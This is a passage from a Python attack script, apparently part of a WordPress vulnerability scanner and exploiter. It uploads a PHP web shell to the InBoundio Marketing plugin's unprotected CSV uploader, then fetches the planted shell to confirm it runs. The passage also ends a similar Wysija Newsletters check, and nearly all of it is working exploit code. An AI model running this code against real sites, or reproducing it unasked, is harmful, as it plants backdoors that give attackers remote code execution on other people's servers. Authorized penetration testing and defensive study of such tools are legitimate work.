        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s%s%s' % ( G,W,B,W,dump_data,W))
    else:
        print ('%s [%s-%s] Wysija Newsletters%s -------------- %s FAIL%s' %(W,R,W,W,R,W))

################ InBoundio Marketing #####################

def wp_inboundiomarketing():
    endpoint = url + "/wp-content/plugins/inboundio-marketing/admin/partials/csv_uploader.php"
    shell = open('./shell/VulnX.php','rb')
    headers['Content_Type'] = 'multipart/form-data'
    options = {
            'file':shell,
    }
    send_shell = requests.post(endpoint,options,headers)
    dump_data = url + "/wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/VulnX.php?Vuln=X"
    response=requests.get(dump_data, headers)
    res  = response.text
    check_wysija = re.findall("Vuln X", res)
    if check_wysija:
        print ('%s [%s+%s] InBoundio Marketing%s ------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s%s%s' % ( G,W,B,W,dump_data,W))
    else:
        print ('%s [%s-%s] InBoundio Marketing%s ------- %s FAIL%s' %(W,R,W,W,R,W))


if __name__ == "__main__":
    args = parse_args()
    url = args.url
    file_name = args.file
    banner()
    detect_cms()